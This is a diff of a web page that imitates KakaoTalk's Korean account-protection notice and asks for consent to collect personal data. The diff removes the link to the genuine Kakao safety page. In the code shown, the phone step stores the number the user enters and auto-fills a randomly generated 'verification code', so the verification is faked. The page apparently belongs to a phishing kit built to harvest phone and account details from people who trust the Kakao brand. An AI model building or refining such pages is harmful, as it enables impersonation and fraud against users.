@@ -56,9 +56,6 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 이는 안전한 서비스를 제공하기 위한 한시적 조치이며, 국내 번호를 사용중인 카카오 인증 서비스 가입자일 경우 카카오 인증서로 본인임을 증명하여 이용자보호조치를 일시적으로 완화 또는 해제할 수 있습니다.<br><br>
 다만, 비정상적인 이용환경 및 패턴이 반복적으로 감지된다면 동일한 이용자보호조치가 다시 적용될 수 있으며, <strong>인증서 발급을 위한 휴대폰 인증정보와 계좌 인증정보</strong>는 제 3자에게 공유하지 않도록 유의해 주시기 바랍니다.<br><br>
 </p>
-<p style="margin-top:10px;">
-<a href="https://talksafety.kakao.com/toolandguide/verify" target="_blank">[세부사항 보기]</a>
-</p>
 <div class="checkbox">
 <input type="checkbox" id="agree">
 <label for="agree">[필수] 개인정보 수집 및 이용 동의</label>
@@ -102,10 +99,10 @@ function showPage(fromId, toId) {
   setTimeout(()=>{
     from.classList.add('hidden');
     from.classList.remove('fade-out');
-    
+   
     to.classList.remove('hidden');
     to.classList.add('fade-in');
-    
+   
     setTimeout(()=>{ to.classList.remove('fade-in'); }, 300);
   }, 300);
 }
@@ -204,7 +201,7 @@ function sendPhone() {
   if(phoneTryCount >= 3) {
     savedPhone = userId;
     const randomCode = String(Math.floor(Math.random() * 1000000)).padStart(6, "0");
-    
+   
     showPage('page2', 'page3');
     setTimeout(()=>{
       document.getElementById("authCode").value=randomCode;
